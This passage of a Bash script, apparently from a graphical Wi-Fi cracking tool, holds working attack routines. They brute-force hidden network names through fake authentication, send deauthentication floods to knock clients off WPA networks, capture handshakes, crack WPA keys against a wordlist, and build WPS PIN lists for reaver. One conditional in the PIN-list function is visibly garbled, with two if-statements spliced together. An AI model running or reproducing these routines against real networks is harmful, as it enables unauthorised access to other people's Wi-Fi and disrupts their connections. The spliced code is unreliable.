		[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_1" --textbox "$path/$keyfile" 440 200
		
	fi
else
	echo "No cap file found"
	#monitor_stop
	[ -s $path/"$ap_mac"_key ]&&cat $path/"$ap_mac"_key >$path/keyfound
fi
echo "off">$path/aircrack_start
killall aireplay-ng
}

function essid_hidden_run()
{
monitor=`head -1 $path/interface_mon`
ap_mac=$(cat $path/ap_mac)
interface=`head -1 $path/interface`
distro=`cat $path/distro`
[ "$distro" = "TinyCore" ]&&file_essid="/usr/local/bin/minileafdwep/minidwep_essid"||file_essid="/tmp/minidwep_essid"
if [ -s "$file_essid" ];then
	iii=1
	client_mac=`head -1 $path/client_mac`
	noaction=`cat $path/task`
	while read line
	do
		[ -z "$client_mac" -a -e $path/me -a "$noaction" != "noaction" ]||break
		echo "now essid is ${line}"
		stdout "`now_time`$msg_34${line}"
		aireplay-ng $no_one -1 0 -e "${line}" -T 1 -a $ap_mac $monitor >$path/fake_auth
		asso=`cat $path/fake_auth|grep -a "Association successful"`
		asso_denied=`cat $path/fake_auth|grep -a "Denied"`
		if [ -n "$asso" ];then
			echo "$ap_mac ${line}">$path/essid_hidden
			break
		fi
		essid_chinese=`echo "${line}"|tr -d "\n"|od -An -t dC|grep -`
		if [ -n "$essid_chinese" ];then 
			[ -n "`ps -ef|grep "minidwep.conf"|grep -v grep`" ]&&killall wpa_supplicant
			echo "network={">$path/minidwep.conf
			echo "	bssid=$ap_mac">>$path/minidwep.conf		
			echo "	key_mgmt=NONE">>$path/minidwep.conf		
			echo "	wep_key0=\"fakekey\"">>$path/minidwep.conf	
			echo "}">>$path/minidwep.conf
			stdout "`now_time`$msg_59"
			wpa_supplicant -i$interface -c $path/minidwep.conf 2>/dev/null &
			sleep 5
			abstract_info_fake_auth $ap_mac
			asso=`cat $path/fake_auth|grep -a "Association successful"`
			if [ -n "$asso" ];then
				echo "$ap_mac ${line}">$path/essid_hidden
				break
			fi
		fi
		iii=$[$iii+1]
		if [ $iii -gt 10 ];then
			iii=1
			wait_for_client_on $ap_mac
			client_mac=`head -1 $path/client_mac`
			[ -n "$client_mac" ]&&break
		fi
		noaction=`cat $path/task`
	done <"$file_essid"
fi
}

function wait_for_client_on()
{
#apmac
cd $path
card_mac=`cat $path/card_mac`
scan=`cat $path/file_scan`
echo "">$path/client_mac
if [ -e "$scan" ]; then
	cat $scan|grep -a -n Station|awk -F : '{print $1}'>$tmp
	cutline=`head -1 $tmp`
	head -n $[$cutline-2] $scan|tail -n +3|awk -F, '{print $1 $4 $5 $6 $9 $14}' >$path/aps_abstract
	cat $path/aps_abstract|grep -a "WEP" >$path/aps_abstract.txt
	if [ -n "`cat $path/aps_abstract.txt`" ];then
		scanlines=$(wc -l $scan |awk '{print$1}')
		tail  $scan -n $[$scanlines - $cutline]|grep -v '^$'|grep -v "not assoiated" |awk -F, '{print $1 $6 $7}'|grep -a -v "$card_mac">$path/clients.txt
		#sed -i -e /"BSSID Privacy Cipher"/,/"Station MAC BSSID Probed ESSID"/d -e /"not associated"/d $path/clients.txt
		error_line=`grep -a -n Station $path/clients|awk -F : '{print $1}'`
		[ -n "$error_line" ]&&sed -i 1,"$error_line"d $path/clients
		cat $path/clients.txt |grep "$1" |awk '{print $1}' >$tmp_abstract
		ch=`head -1 $path/ch`
		if [ "$ch" = "1" -o "$ch" = "2" -o "$ch" = "3" -o "$ch" = "4" -o "$ch" = "5" -o "$ch" = "6" -o "$ch" = "7" -o "$ch" = "8" -o "$ch" = "9" -o "$ch" = "10" -o "$ch" = "11" -o "$ch" = "12" -o "$ch" = "13" -o "$ch" = "14" ]
		then
			echo "ch is $ch,OK"
		else
			ch_now=`cat $path/aps_abstract|grep -a "$1"|awk '{print $2}'`
			if [ "$ch_now" = "1" -o "$ch_now" = "2" -o "$ch_now" = "3" -o "$ch_now" = "4" -o "$ch_now" = "5" -o "$ch_now" = "6" -o "$ch_now" = "7" -o "$ch_now" = "8" -o "$ch_now" = "9" -o "$ch_now" = "10" -o "$ch_now" = "11" -o "$ch_now" = "12" -o "$ch_now" = "13" -o "$ch_now" = "14" ]
			then
				echo "$ch_now">$path/ch
			fi
		fi
		client_mac=$(head -1 $tmp_abstract)
		if [ -n "$client_mac" ];then
			echo "Got a client MAC"
			stdout "`now_time`$msg_41:$client_mac"
			echo "$client_mac">$path/client_mac
		else
			echo "NO client found"
			stdout "`now_time`$msg_47"
		fi
	fi
else
	echo "scan file not available"
fi
}
function wpa_attack()
{
#$apmac $apname $apchannel $apclientmac $monitor
ap_mac=$(cat $path/ap_mac)
cat $path/aps_clients|grep -a "$ap_mac"|awk '{print$6}'>$tmp
cat $tmp|awk -F - '{print $2}'>$path/client_mac
client_mac=$(head -1 $path/client_mac)
echo "client_mac is $client_mac"
cat $path/aps_clients|grep -a "$ap_mac"|awk '{print$4}'>$tmp
cat $tmp|awk -F - '{print "channel "$2}'>$path/ch
ch=$(head -1 $path/ch|awk '{print$2}')
		if [ -e $path/interfaces_mons ];then
			interface_sel=`cat $path/interface_sel`
			interface_mon=`cat $path/interfaces_mons|grep $interface_sel|awk '{print$2}'`
			echo $interface_mon>$path/interface_mon
			interface_used=`ps -ef|grep reaver|grep $interface_mon|grep -v grep`
			interface_used1=`ps -ef|grep airodump-ng|grep $interface_mon|grep -v grep`
			if [ -n "$interface_used" -o -n "$interface_used1" ];then
				[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_77"&
				[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_77" 10 20&
				[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_77"&
				return
			fi
		else
			monitor=`head -1 $path/interface_mon`
			if [ -n "$monitor" ];then
				interface_used1=`ps -ef|grep airodump-ng|grep $interface_mon|grep -v grep`
				interface_used=`ps -ef|grep reaver|grep $monitor |grep -v grep`
			fi
			if [ -n "$interface_used" -o -n "$interface_used1" ];then
				[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_77"&
				[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_77" 10 20&
				[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_77"&			
				return
			fi
			monitor_start
		fi
#monitor_start
monitor=`head -1 $path/interface_mon`
p6=`cat $path/aps|grep -a "$ap_mac"|awk '{print $6}'`
p7=`cat $path/aps|grep -a "$ap_mac"|awk '{print $7}'`
p8=`cat $path/aps|grep -a "$ap_mac"|awk '{print $8}'`
p9=`cat $path/aps|grep -a "$ap_mac"|awk '{print $9}'`
[ -n "$p6" ]&&ap_name=$p6
[ -n "$p7" ]&&ap_name=$p6"_"$p7
[ -n "$p8" ]&&ap_name=$p6"_"$p7"_"$p8
[ -n "$p9" ]&&ap_name=$p6"_"$p7"_"$p8"_"$p9
stdout "`now_time`$msg_33" 
cd $path
rm -f $path/scan*
[ "$ch" = "108" ]&&ch="1"
[ "$ch" = "113" ]&&ch="2"
[ "$ch" = "118" ]&&ch="3"
[ "$ch" = "123" ]&&ch="4"
[ "$ch" = "128" ]&&ch="5"
[ "$ch" = "133" ]&&ch="6"
[ "$ch" = "138" ]&&ch="7"
[ "$ch" = "143" ]&&ch="8"
[ "$ch" = "148" ]&&ch="9"
[ "$ch" = "153" ]&&ch="10"
[ "$ch" = "158" ]&&ch="11"
[ "$ch" = "163" ]&&ch="12"
[ "$ch" = "168" ]&&ch="13"
[ "$ch" = "173" ]&&ch="14"
if [ "$ch" = "1" -o "$ch" = "2" -o "$ch" = "3" -o "$ch" = "4" -o "$ch" = "5" -o "$ch" = "6" -o "$ch" = "7" -o "$ch" = "8" -o "$ch" = "9" -o "$ch" = "10" -o "$ch" = "11" -o "$ch" = "12" -o "$ch" = "13" -o "$ch" = "14" ]
then
	air=`date +%s`
	echo "$dg_1-$air">$path/air_na
	[ -n "`cat $path/term|grep "urxvt"`" ]&&urxvt --title "$dg_1-$air" -iconic -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor &
	[ -n "`cat $path/term|grep "xterm"`" ]&&xterm -title "$dg_1-$air" -iconic -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor &
	[ -n "`cat $path/term|grep "aterm"`" ]&&aterm --title "$dg_1-$air" -e airodump-ng $no_one -w $path/scan -c $ch --bssid $ap_mac $monitor &
else
	air=`date +%s`
	echo "$dg_1-$air">$path/air_na
	[ -n "`cat $path/term|grep "urxvt"`" ]&&urxvt --title "$dg_1-$air" -iconic -e airodump-ng $no_one -w $path/scan --bssid $ap_mac $monitor &
	[ -n "`cat $path/term|grep "xterm"`" ]&&xterm -title "$dg_1-$air" -iconic -e airodump-ng $no_one -w $path/scan --bssid $ap_mac $monitor &
	[ -n "`cat $path/term|grep "aterm"`" ]&&aterm --title "$dg_1-$air" -e airodump-ng $no_one -w $path/scan --bssid $ap_mac $monitor &
fi
echo "urxvt -iconic -e airodump-ng -w $path/scan -c $ch --bssid $ap_mac $monitor "
counter=1
while [ -e $path/wpa_start ]
do
	[ -e $path/wpa_start ]&&echo "">$path/disable_scan_button||rm -f $path/disable_scan_button
	aircrack-ng $path/scan-01.cap >$tmp
	handshake=`cat $tmp |grep -a "1 handshake"`
	no_packet=`cat $tmp|grep -a "Got no data packets from target network"`
	no_handshake=`cat $tmp|grep -a "No valid WPA handshakes found"`
	if [ -n "$no_handshake" -o -n "$no_packet" ];then
		echo "Waiting for a four-way WPA handshake !"
		[ "$lang" = "zh" ]&&msg_35="等待$ap_mac的握手包"||msg_35="Waiting for WPA handshake with $ap_mac"
		stdout "`now_time`$msg_35"
		file_scan=`cat $path/file_scan`
	fi
	if [ -n "$handshake" ];then
		echo "WPA handshake captured!"
		cap_name=""$ap_mac"_handshake.cap"
		cap_name=`echo $cap_name|tr : -`
		air_na=`cat $path/air_na`
		if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
			kill `ps -ef|grep airodump-ng|grep $air_na|awk '{print$1}'`
		else
			kill `ps -ef|grep airodump-ng|grep $air_na|awk '{print$2}'`
		fi
		rm -f $path/wpa_start $path/air_na
		stdout "`now_time`$msg_36" 
		cp -f $path/scan-01.cap /tmp/$cap_name
		[ -n "`aircrack-ng --help|grep "EWSA Project file"`" ]&&aircrack-ng -E /tmp/$cap_name /tmp/$cap_name
		[ -n "`aircrack-ng --help|grep "Hashcat Capture file"`" ]&&aircrack-ng -J /tmp/$cap_name /tmp/$cap_name
		[ "$lang" = "zh" ]&&msg_50="握手包文件:/tmp/$cap_name"||msg_50="handshake file:/tmp/$cap_name"
		if [ -n "`aircrack-ng --help|grep "EWSA Project file"`" ];then
			if [ "$lang" = "zh" ];then
				msg_50a="EWSA可用握手包文件:/tmp/$cap_name.wkp"
				msg_50a1="EWSA可用握手包文件:\n/tmp/$cap_name.wkp"
			else
				msg_50a="Handshake file for EWSA:/tmp/$cap_name.wkp"
				msg_50a1="Handshake file for EWSA:\n/tmp/$cap_name.wkp"
			fi
		fi
		if [ -n "`aircrack-ng --help|grep "Hashcat Capture file"`" ];then
			if [ "$lang" = "zh" ];then
				msg_50b="Hashcat可用握手包文件:/tmp/$cap_name.hccap"
				msg_50b1="Hashcat可用握手包文件:\n/tmp/$cap_name.hccap"
			else
				msg_50b="Handshake file for Hashcat:/tmp/$cap_name.hccap"
				msg_50b1="Handshake file for Hashcat:\n/tmp/$cap_name.hccap"
			fi
		fi	
		stdout "$msg_50"
		[ -n "$msg_50a" ]&&stdout "$msg_50a"
		[ -n "$msg_50b" ]&&stdout "$msg_50b"
		echo "">$path/xd
		[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&\
		Xdialog --title "$dg_1" --radiolist "$dg_2" 12 40 8 "Yes" "" on  "No" "" off 2>$tmp_yesno
		[ -n "`cat $path/dialog|grep "zenity"`" ]&&\
		zenity --list --radiolist --title="$dg_1" --text="$dg_2"  --column="" --column=""  true "Yes" "" "No" >$tmp_yesno
		[ -n "`cat $path/dialog|grep "kdialog"`" ]&&\
		kdialog --title "$dg_1" --radiolist "$dg_2"  "Yes" "Yes" on  "No" "No" off >$tmp_yesno
		yesno=`cat $tmp_yesno`
		if [ "$yesno" != "Yes" ];then
			rm -f $path/xd
			echo "">$path/xd
			[ "$lang" = "zh" ]&&dg_3="没有选择任何字典! \nWPA握手包文件在这里:\n/tmp/$cap_name\n$msg_50a1\n$msg_50b1"||dg_3="No password dictionary selected! \nHere you can find WPA hadnshake:\n/tmp/$cap_name\n$msg_50a1\n$msg_50b1" 
			[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "$dg_1" --msgbox "$dg_3" 15 40
			[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --info --title="$dg_1" --text="$dg_3"
			[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_1" --msgbox "$dg_3"
			rm -f $path/xd
			echo "off">$path/wpa_on
			echo "No password dictionary selected" >$path/keyfound
			rm -f $path/wpa_start	
			[ -s "/tmp/$cap_name" ]&&(minicopy "/tmp/$cap_name") &
			break
		fi
		rm -f $path/xd
		if [ ! -e "$path/dict_selected" ];then
			dictname="/tmp/wordlist.txt"
		else
			dictname=`cat $path/dict_selected`
		fi
		echo "">$path/xd
		[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "$dg_5" --fselect "$dictname" 30 60 2>$tmp2
		[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --file-selection --title="$dg_5" --filename="$dictname" >$tmp2
		[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_5" --getopenfilename "$dictname" >$tmp2
		rm -f $path/xd
		dictname=`tail -1 $tmp2`
		echo "$dictname">$path/dict_selected
		if [ -n "$dictname" -a "$dictname" != "/" -a -s "$dictname" ];then
			rm -f $path/keyfound
			air_edition=`cat $path/air_edition`
			stdout "`now_time`$msg_51"
			aircrack_edition=`aircrack-ng --help|grep "Aircrack-ng 1.0"|awk '{print $3}'`
			aircrack_edition0=`aircrack-ng --help|grep "Aircrack-ng 0"`
			[ -z "$aircrack_edition0" -a -z "$aircrack_edition" ]&&aircrack_edition="-"
			[ -n "$aircrack_edition0" ]&&aircrack_edition="rc1"
			if [ "$aircrack_edition" != "rc1" -a "$aircrack_edition" != "rc2" -a -n "$aircrack_edition" ];then
				[ -n "`cat $path/term|grep "urxvt"`" ]&&urxvt -e aircrack-ng -b $ap_mac -w $dictname -l $path/keyfound $path/scan-01.cap
				[ -n "`cat $path/term|grep "xterm"`" ]&&xterm -e aircrack-ng -b $ap_mac -w $dictname -l $path/keyfound $path/scan-01.cap
				[ -n "`cat $path/term|grep "aterm"`" ]&&aterm -e aircrack-ng -b $ap_mac -w $dictname -l $path/keyfound $path/scan-01.cap
				stdout "`now_time`$msg_52"
			else
				aircrack-ng -b $ap_mac -w $dictname $path/scan-01.cap |tee $tmp
				stdout "`now_time`$msg_52"
				cat $tmp |grep "KEY FOUND"|awk '{print$4}'>$path/tmp.txt
				head -1 $path/tmp.txt >$path/keyfound
			fi
			if [ -s $path/keyfound ];then
				key=`cat $path/keyfound`
				echo "key found : $key"
				[ "$lang" = "zh" ]&&msg_42="找到[$ap_mac]的WPA密码:$key"||msg_42="WPA KEY of [$ap_mac] FOUND:$key"
				stdout "`now_time`$msg_42"
				echo "">$path/xd
				[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "dg_12" --msgbox "Essid:$ap_name\nBssid: $ap_mac\nWPA KEY: $key " 8 50
				[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --info --title="$dg_12" --text="Essid:$ap_name\nBssid: $ap_mac\nWPA KEY: $key "
				[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_12" --msgbox "Essid:$ap_name\nBssid: $ap_mac\nWPA KEY: $key " 
				rm -f $path/xd
				echo "Essid: $ap_name">$path/"$ap_mac"_key
				echo "Bssid: $ap_mac">>$path/"$ap_mac"_key
				echo "WPA Key Found: $key" >>$path/"$ap_mac"_key
				echo "off">$path/wpa_on
				cp -f $path/"$ap_mac"_key /tmp
				rm -f $path/wpa_start
				[ -s "/tmp/$cap_name" ]&&(minicopy "/tmp/$cap_name")&
				break
			else
				stdout "`now_time`$msg_43"
				echo "">$path/xd
				[ "$lang" = "zh" ]&&dg_6="在字典中没有发现密码! \nWPA握手包文件在这里:\n/tmp/$cap_name\n$msg_50a1\n$msg_50b1"||dg_6="No key found in the dictionary! \nHere you can find WPA hadnshake:\n/tmp/$cap_name\n$msg_50a1\n$msg_50b1"
				[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "$dg_1" --msgbox "$dg_6" 7 50
				[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --info --title="$dg_1" --text="$dg_6 "
				[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_1" --msgbox "$dg_6"
				rm -f $path/xd
				echo "off">$path/wpa_on
				#auto enable lanch and scan button
				echo "No WPA key found in your dictionary">$path/keyfound
				rm -f $path/wpa_start
				[ -s "/tmp/$cap_name" ]&&(minicopy "/tmp/$cap_name")&
				break
			fi
		else
			stdout "`now_time`$msg_53" 
			echo "">$path/xd
			[ "$lang" = "zh" ]&&dg_6="在字典中没有发现密码! \nWPA握手包文件在这里:\n/tmp/$cap_name\n$msg_50a1\n$msg_50b1"||dg_6="No key found in the dictionary! \nHere you can find WPA hadnshake:\n/tmp/$cap_name\n$msg_50a1\n$msg_50b1"
			[ -n "`cat $path/dialog|grep "Xdialog"`" ]&&Xdialog --title "$dg_1" --msgbox "$dg_6" 7 50
			[ -n "`cat $path/dialog|grep "zenity"`" ]&&zenity --info --title="$dg_1" --text="$dg_6 "
			[ -n "`cat $path/dialog|grep "kdialog"`" ]&&kdialog --title "$dg_1" --msgbox "$dg_6"
			rm -f $path/xd
			echo "off">$path/wpa_on
			#auto enable lanch and scan button
			echo "No password dictionary selected">$path/keyfound
			rm -f $path/wpa_start
			[ -s "/tmp/$cap_name" ]&&(minicopy "/tmp/$cap_name")&
			break
		fi			
	fi
	client_mac=`cat $path/client_mac`
	if [ -z "$client_mac" ];then
		stdout "`now_time`$msg_38"
		abstract_info_aps "WPA" $ap_mac
		client_mac=`cat $path/client_mac`
	else
		echo "$client_mac">$path/wpa_clients
	fi
	if [ -n "$client_mac" ];then
		[ -s $path/wpa_clients ]||echo "$client_mac">$path/wpa_clients
		while read line
		do
			if [ -n ${line} ];then
				client_mac=${line}
				stdout "`now_time`$msg_54" 
				[ $counter -eq 1 ]&&aireplay-ng -0 3 -a $ap_mac -c $client_mac -x 100 $monitor $no_one
				[ $counter -eq 2 ]&&aireplay-ng -0 3 -a $ap_mac -c $client_mac $monitor $no_one
				[ $counter -eq 3 ]&&aireplay-ng -0 3 -a $ap_mac -c $client_mac -x 200 $monitor $no_one
				counter=$(($counter+1))
				sec=30
				[ "$lang" = "zh" ]&&msg_39="等待$sec秒以便获得认证握手包!"||msg_39="Wait $sec seconds for authentication handshake!"
				stdout "`now_time`$msg_39" 
				sleep "$sec"
				aircrack-ng $path/scan-01.cap >$tmp
				handshake=`cat $tmp |grep -a "1 handshake"`
				[ -n "$handshake" ]&&break
				if [ $counter -ge 4 ];then
					counter=1
					stdout "`now_time`$msg_40"
					sleep 40 
				fi
			fi
		done < $path/wpa_clients
	fi
	#air_now=`date +%s`
	#if [ $[$air_now-$air] -gt 6 ];then
	#	if [ -n "`ps --help 2>&1|grep BusyBox|grep -v grep`" ];then
	#		if [ -z "`ps -ef|grep -a "$dg_1-$air"|grep -v grep|awk '{print$1}'|head -1`" ];then
	#			rm -f $path/wpa_start  $path/air_na $path/disable_scan_button
	#			echo "noaction">$path/task
	#			break
	#		fi
	#	else
	#		if [ -z "`ps -ef|grep -a "$dg_1-$air"|grep -v grep|awk '{print$2}'|head -1`" ];then
	#			rm -f $path/wpa_start  $path/air_na $path/disable_scan_button
	#			echo "noaction">$path/task 
	#			break
	#		fi
	#	fi
	#fi 
done
rm -f $path/wpa_start  $path/air_na $path/disable_scan_button
}
function abstract_info_aps()
{
#wep_wpa apmac
cd $path
[ -z "$wep_wpa" ]&&wep_wpa=`head -1 $path/wep_wpa` 
card_mac=`cat $path/card_mac`
scan=`cat $path/file_scan`
if [ -e "$scan" ]; then
	cutline=`cat $scan|grep -a -n Station|awk -F : '{print $1}'`
	head -n $[$cutline-2] $scan|tail -n +3|awk -F, '{print $1 $4 $5 $6 $9 $14}' >$path/aps_abstract
	if [ "$wep_wpa" = "WEP" ];then
		cat $path/aps_abstract|grep -a "WEP" >$path/aps_abstract.txt
	else
		cat $path/aps_abstract|grep -a "WPA" >$path/aps_abstract.txt
	fi
	if [ -n "`cat $path/aps_abstract.txt`" ];then
		scanlines=$(wc -l $scan |awk '{print$1}')
		tail  $scan -n $[$scanlines - $cutline]|grep -v '^$'|grep -v "not assoiated" |awk -F, '{print $1 $6 $7}'|grep -v "$card_mac">$path/clients.txt
		#sed -i -e /"BSSID Privacy Cipher"/,/"Station MAC BSSID Probed ESSID"/d -e /"not associated"/d $path/clients.txt
		error_line=`grep -a -n Station $path/clients|awk -F : '{print $1}'`
		[ -n "$error_line" ]&&sed -i 1,"$error_line"d $path/clients
		cat $path/clients.txt |grep -a "$2" |awk '{print $1}' >$tmp_abstract
		client_mac=$(head -1 $tmp_abstract)
		if [ -n "$client_mac" ];then
			echo "$client_mac" >$path/client_mac
			stdout "`now_time`$msg_41: $client_mac"
			cat $path/clients.txt |grep -a "$2" |awk '{print $1}' >$path/wpa_clients
		else
			echo "">$path/client_mac
		fi
	fi
fi
}
function abstract_info_fake_auth()
{
#apmac
cd $path
card_mac=`cat $path/card_mac`
scan=`cat $path/file_scan`
echo "">$path/client_mac
if [ -e "$scan" ]; then
	cat $scan|grep -a -n Station|awk -F : '{print $1}'>$tmp
	cutline=`head -1 $tmp`
	head -n $[$cutline-2] $scan|tail -n +3|awk -F, '{print $1 $4 $5 $6 $9 $14}' >$path/aps_abstract
	cat $path/aps_abstract|grep -a "WEP" >$path/aps_abstract.txt
	if [ -n "`cat $path/aps_abstract.txt`" ];then
		scanlines=$(wc -l $scan |awk '{print$1}')
		tail  $scan -n $[$scanlines - $cutline]|grep -v '^$'|grep -v "not assoiated" |awk -F, '{print $1 $6 $7}'|grep -a "$card_mac">$path/clients.txt
		#sed -i -e /"BSSID Privacy Cipher"/,/"Station MAC BSSID Probed ESSID"/d -e /"not associated"/d $path/clients.txt
		error_line=`grep -a -n Station $path/clients|awk -F : '{print $1}'`
		[ -n "$error_line" ]&&sed -i 1,"$error_line"d $path/clients
		cat $path/clients.txt |grep -a "$1" |awk '{print $1}' >$tmp_abstract
		client_mac=$(head -1 $tmp_abstract)
		cat $client_mac>/tmp/tmp
		if [ -n "$client_mac" ];then
			echo "wpa_supplicant Fake auth successfully"
			echo "Association successful">$path/fake_auth
			stdout "`now_time`$msg_60"
		else
			echo "Attack was unsuccessful">$path/fake_auth
			stdout "`now_time`$msg_61"
		fi
	else
		echo "Fake auth unsuccessfully"
		stdout "`now_time`$msg_61"
	fi
else
	echo "Fake auth unsuccessfully"
	stdout "`now_time`wpa_supplicant auth failed"
fi
}
function make_four()
{
#$1 min $2 max $3 wpc_na
#echo "0">$3
#echo "0">>$3
#echo "0">>$3
for ((ii=$1;ii<=$2;ii++))
do
    ii_out=$ii		
    [ ${#ii} -eq 1 ]&&ii_out="000$ii"			
    [ ${#ii} -eq 2 ]&&ii_out="00$ii"			
    [ ${#ii} -eq 3 ]&&ii_out="0$ii"			
    echo "$ii_out">>$3
done
}
function make_three()
{
#$1 wpc_na
i=0
for ((i=0;i<=999;i++))
do
    i_out=$i	
    [ ${#i} -eq 1 ]&&i_out="00$i"			
    [ ${#i} -eq 2 ]&&i_out="0$i"			
    echo "$i_out">>$1
done
}
function make_three_spec()
{
#$1 wpc_na  $2 specific figure
echo $2>>$1
i=0
for ((i=0;i<=999;i++))
do
    i_out=$i	
    [ ${#i} -eq 1 ]&&i_out="00$i"			
    [ ${#i} -eq 2 ]&&i_out="0$i"			
    [ "$i_out" != "$2" ]&&echo "$i_out">>$1
done
}
function make_wpc()
{
#$1 ap mac $2 method No.
ap_mac_wpc=`echo $1|tr -d :`
wpc_na="$path/"$ap_mac_wpc".wpc"
if [ "$2" = "1" ];then
	[ -n "`ps -ef|grep reaver|grep $1|grep -v grep|tail -1`" ]&&return
fi
if [ -e $wpc_na ];then
	[ "$dialog" = "zenity" ]&&go=`zenity --list --radiolist --title="$dg_1" --text="'$wpc_na'$msg_74" --column="" --column="" "" "Yes" true "No"`
	[ "$dialog" = "Xdialog" ]&&go=`Xdialog --title "$dg_1" --radiolist "$wpc_na$msg_74 " 15 25 8 "Yes" "" off  "No" "" on 2>&1`
	[ "$dialog" = "kdialog" ]&&go=`kdialog --title "$dg_1" --radiolist "$wpc_na$msg_74"  "Yes" "Yes" off  "No" "No" on`
	if [ "$go" != "Yes" ];then
		return
	fi
fi
if [ "$2" = "0" ];then
unset f[*]
f[0]="2345678910"
f[1]="3456789210"
f[2]="4567893210"
f[3]="5678943210"
f[4]="6789543210"
f[5]="7896543210"
f[6]="8976543210"
f[7]="9876543210"
f[8]="8765432109"
f[9]="7654321098"
f[10]="6543210987"
n=`expr $RANDOM|awk '{print $1%10}'`
figures=${f[$n]}
sort_re_w=0
while [ "$sort_re_w" != "10"  -o "$a0" != "2" -o "$a1" != "2" -o "$a2" != "2" -o "$a3" != "2" \
-o "$a4" != "2" -o "$a5" != "2" -o "$a6" != "2"  -o "$a7" != "2" -o "$a8" != "2" -o "$a9" != "2" ] 
do
	[ "$dialog" = "zenity" ]&&sort_re=`zenity --title="$dg_1" --entry --text="$msg_75" --entry-text="$figures"`
	[ "$dialog" = "Xdialog" ]&&sort_re=`Xdialog --title "$dg_1" --inputbox "$msg_75" 15 50 "$figures" 2>&1`
	[ "$dialog" = "kdialog" ]&&sort_re=`kdialog --title "$dg_1" --inputbox "$msg_75k" "$figures"`
	[ -n "$sort_re" ]&&sort_re_w=`expr $sort_re : '[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]$'`
	a0=`echo $sort_re|awk -F 0 '{print NF}'`
	a1=`echo $sort_re|awk -F 1 '{print NF}'`
	a2=`echo $sort_re|awk -F 2 '{print NF}'`
	a3=`echo $sort_re|awk -F 3 '{print NF}'`
	a4=`echo $sort_re|awk -F 4 '{print NF}'`
	a5=`echo $sort_re|awk -F 5 '{print NF}'`
	a6=`echo $sort_re|awk -F 6 '{print NF}'`
	a7=`echo $sort_re|awk -F 7 '{print NF}'`
	a8=`echo $sort_re|awk -F 8 '{print NF}'`
	a9=`echo $sort_re|awk -F 9 '{print NF}'`
	if [ "$sort_re_w" = "10" -a "$a0" = "2" -a "$a1" = "2" -a "$a2" = "2" -a "$a3" = "2" \
-a "$a4" = "2" -a "$a5" = "2" -a "$a6" = "2"  -a "$a7" = "2" -a "$a8" = "2" -a "$a9" = "2" ]
	then
		unset d[*]
		i=0
		for ((i=0;i<=9;i++))
		do
			d[$i]=`echo $sort_re|cut -c $[$i+1]`
			if [ "${d[$i]}" = "0" ];then 
				d_min=0;d_max=999
			fi
			if [ "${d[$i]}" if [ "$sort_re_w" = "10" -a "$a0" = "2" -a "$a1" = "2" -a "$a2" = "2" -a "$a3" = "2" \
-a "$a4" = "2" -a "$a5" = "2" -a "$a6" = "2"  -a "$a7" = "2" -a "$a8" = "2" -a "$a9" = "2" ]
	then= "1" ];then
				d_min=1000;d_max=1999
			fi
			if [ "${d[$i]}" = "1" ];then
				d_min=1000
				d_max=1999
			fi	
			if [ "${d[$i]}" = "2" ];then 
				d_min=2000
				d_max=2999
			fi	
			if [ "${d[$i]}" = "3" ];then 
				d_min=3000	
				d_max=3999
			fi
			if [ "${d[$i]}" = "4" ];then
				d_min=4000
				d_max=4999
			fi
			if [ "${d[$i]}" = "5" ];then
				d_min=5000
				d_max=5999
			fi
			if [ "${d[$i]}" = "6" ];then
				d_min=6000
				d_max=6999
			fi	
			if [ "${d[$i]}" = "7" ];then
				d_min=7000
				d_max=7999
			fi
			if [ "${d[$i]}" = "8" ];then
				d_min=8000
				d_max=8999
			fi
			if [ "${d[$i]}" = "9" ];then
				d_min=9000
				d_max=9999
			fi	
			if [ $i -eq 0 ];then
				echo "0">$wpc_na
				echo "0">>$wpc_na
				echo "0">>$wpc_na
			fi
			make_four $d_min $d_max $wpc_na
		done		
		make_three $wpc_na
		[ "$dialog" = "zenity" ]&&zenity --info --title="$dg_1" --text="$msg_76\n$wpc_na"&
		[ "$dialog" = "Xdialog" ]&&Xdialog --title "$dg_1"  --msgbox  "$msg_76\n$wpc_na" 10 20&
		[ "$dialog" = "kdialog" ]&&kdialog --title "$dg_1"  --msgbox  "$msg_76\n$wpc_na"&			
		break;
	fi
done
fi
if [ "$2" = "1" -o "$2" = "2" ];then
[ -n "`ps -ef|grep reaver|grep $1|grep -v grep|tail -1`" ]&&return
sort_re_w=0
fig=`echo $ap_mac_wpc|cut -c 7-12`
figures=`echo $((16#$fig))`
[ ${#figures} -eq 1 ]&&figures="000000"$figures
[ ${#figures} -eq 2 ]&&figures="00000"$figures
[ ${#figures} -eq 3 ]&&figures="0000"$figures
[ ${#figures} -eq 4 ]&&figures="000"$figures
[ ${#figures} -eq 5 ]&&figures="00"$figures
[ ${#figures} -eq 6 ]&&figures="0"$figures
[ ${#figures} -eq 8 ]&&figures=`echo $figures|cut -c 2-8`
[ ${#figures} -eq 9 ]&&figures=`echo $figures|cut -c 3-9`
p1=`echo $figures|cut -c 1`
p2=`echo $figures|cut -c 2`
